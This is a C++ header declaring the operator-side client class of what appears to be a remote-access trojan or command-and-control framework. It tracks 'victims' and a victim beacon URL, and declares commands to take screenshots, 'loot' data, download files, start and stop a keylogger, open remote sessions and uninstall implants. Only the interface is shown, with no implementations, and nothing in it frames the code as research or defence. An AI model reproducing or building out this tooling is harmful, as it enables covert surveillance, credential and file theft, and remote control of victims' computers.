#pragma once

#include "Builder.hpp"
#include "Config.hpp"
#include "LogManager.hpp"
#include "CommandManager.hpp"
#include "ResultManager.hpp"
#include "VictimManager.hpp"
#include "SessionManager.hpp"
#include "RestGateway.hpp"

#include <atomic>
#include <optional>
#include <string>

class Client {
private:
    Config& m_config;
    Builder& m_builder;

    LogManager& m_log_man;
    CommandManager& m_cmd_man;
    ResultManager& m_result_man;
    VictimManager& m_vic_man;
    SessionManager& m_sess_man;

    RestGateway m_gateway;
    std::string m_status_text;

    size_t m_last_id;
    std::atomic<size_t> m_victim_count{0};

    void updateStatusText();

    [[nodiscard]] std::optional<UUID> post_victim_command(
        const UUID& client_id,
        const std::string& command_text,
        const char* failure_label);

public:
    Client(const Client&) = delete;
    Client& operator=(const Client&) = delete;
    Client(Client&&) = delete;
    Client& operator=(Client&&) = delete;
    explicit Client(const std::string& db_path = "client.db");

    static Client& instance(const std::string& db_path = "client.db");

    [[nodiscard]] bool hasServerSession() const;

    [[nodiscard]] std::string getUsername() const;
    [[nodiscard]] std::string getPassword() const;
    [[nodiscard]] std::string getServerUrl() const;
    [[nodiscard]] std::string getServerHost() const;
    [[nodiscard]] std::string getVictimBeaconUrl() const;
    [[nodiscard]] std::string getTimeout() const;
    [[nodiscard]] std::string getOutputPath() const;

    void setUsername(const std::string& username);
    void setPassword(const std::string& password);
    void setServerUrl(const std::string& server_url);
    void setTimeout(const std::string& timeout);
    void setOutputPath(const std::string& output_path);

    [[nodiscard]] const char* getStatusText() const;
    [[nodiscard]] const std::vector<Victim>& getVictims() const;

    [[nodiscard]] bool login();
    [[nodiscard]] bool fetchVictims();
    [[nodiscard]] bool fetchLogs();
    [[nodiscard]] bool fetchResults();
    [[nodiscard]] bool pollResults();
    [[nodiscard]] bool sendLogBuffer();

    [[nodiscard]] bool sendTimeoutCommand(const UUID& client_id, int timeout);
    [[nodiscard]] bool sendOpenSessionCommand(const UUID& client_id, int64_t port);
    [[nodiscard]] bool sendCloseSessionCommand(const UUID& client_id);
    [[nodiscard]] bool sendScreenshotCommand(const UUID& client_id);
    [[nodiscard]] bool sendLootCommand(const UUID& client_id);
    [[nodiscard]] bool sendDownloadCommand(const UUID& client_id, const std::string& path);
    [[nodiscard]] bool sendStartKeyloggerCommand(const UUID& client_id);
    [[nodiscard]] bool sendStopKeyloggerCommand(const UUID& client_id);
    [[nodiscard]] bool sendUninstallCommand(const UUID& client_id);
    [[nodiscard]] bool uninstallVictim(const Victim& victim);

    [[nodiscard]] bool sendTimeoutCommand(int64_t client_id, int timeout);
    [[nodiscard]] bool sendOpenSessionCommand(int64_t client_id, int64_t port);
    [[nodiscard]] bool sendCloseSessionCommand(int64_t client_id);
    [[nodiscard]] bool sendScreenshotCommand(int64_t client_id);
    [[nodiscard]] bool sendLootCommand(int64_t client_id);
    [[nodiscard]] bool sendDownloadCommand(int64_t client_id, const std::string& path);
    [[nodiscard]] bool sendStartKeyloggerCommand(int64_t client_id);
    [[nodiscard]] bool sendStopKeyloggerCommand(int64_t client_id);
    [[nodiscard]] bool sendUninstallCommand(int64_t client_id);

    [[nodiscard]] bool openSession(int64_t port);
    [[nodiscard]] bool closeSession(int64_t port);
    [[nodiscard]] bool registerTemplate(const std::string& username, const std::string& password);
};
